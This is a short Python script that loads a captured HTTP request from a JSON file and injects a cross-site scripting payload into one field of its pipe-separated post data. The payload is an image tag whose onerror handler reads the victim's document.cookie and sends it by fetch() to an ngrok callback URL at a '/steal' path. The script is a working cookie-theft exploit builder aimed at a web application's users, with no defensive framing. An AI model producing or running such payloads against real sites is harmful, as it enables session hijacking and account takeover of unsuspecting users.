import json
from pathlib import Path


def load_json_postData():
    file_path = Path("captured_request_js.json")

    with open(file_path, "r", encoding="utf-8") as f:
        data = json.load(f)
    postData: str = data["postData"]
    return postData.split("|")


def load_json_cookie():
    file_path = Path("captured_request_js.json")

    with open(file_path, "r", encoding="utf-8") as f:
        data = json.load(f)
    cookie: str = data["headers"]["Cookie"]
    return cookie


if __name__ == "__main__":
    t = load_json_postData()
    CALLBACK_URL = "https://your-ngrok-url.ngrok-free.app"
    XSS_PAYLOAD_TEMPLATE = f"""<img src="invalid" onerror="var cookie = document.cookie;fetch('{CALLBACK_URL}/steal?cookie=' + encodeURIComponent(cookie),{{method: 'get', headers: new Headers({{'ngrok-skip-browser-warning': '69420'}})}}).then( () => {{console.log('cookie sent')}})">"""
    t[11] = XSS_PAYLOAD_TEMPLATE
    print("|".join(t))
